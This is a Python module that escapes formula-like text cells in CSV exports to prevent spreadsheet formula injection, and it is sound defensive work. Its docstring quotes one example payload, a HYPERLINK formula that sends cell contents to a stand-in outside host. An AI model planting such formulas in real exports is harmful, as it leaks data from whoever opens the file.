"""CSV exports that a spreadsheet cannot execute (CSV / formula injection, OWASP).

Exported cells can contain text that came from a submission: rule evidence, analyst comments,
entity names. A spreadsheet treats a cell that begins with `=`, `+`, `-`, `@`, a tab or a
carriage return as a formula, so a crafted value such as `=HYPERLINK("http://x/?"&A1,"open")`
could run when an examiner opens the export. Such text cells are written with a leading
apostrophe, which spreadsheets display as plain text. Numbers are written unchanged.
"""

from __future__ import annotations

import csv
from collections.abc import Iterable, Mapping
from typing import Any, TextIO

FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r", "＝", "＋", "－", "＠")


def safe_cell(value: Any) -> Any:
    if isinstance(value, str) and value.startswith(FORMULA_PREFIXES):
        return "'" + value
    return value


def safe_row(row: Iterable[Any]) -> list[Any]:
    return [safe_cell(v) for v in row]


class SafeWriter:
    """`csv.writer` that escapes formula-like text cells."""

    def __init__(self, f: TextIO, **kwargs: Any):
        self._writer = csv.writer(f, **kwargs)

    def writerow(self, row: Iterable[Any]) -> Any:
        return self._writer.writerow(safe_row(row))

    def writerows(self, rows: Iterable[Iterable[Any]]) -> None:
        for row in rows:
            self.writerow(row)


class SafeDictWriter(csv.DictWriter):  # type: ignore[type-arg]
    """`csv.DictWriter` that escapes formula-like text cells."""

    def writerow(self, rowdict: Mapping[str, Any]) -> Any:
        return super().writerow({k: safe_cell(v) for k, v in rowdict.items()})

    def writerows(self, rowdicts: Iterable[Mapping[str, Any]]) -> None:
        for row in rowdicts:
            self.writerow(row)
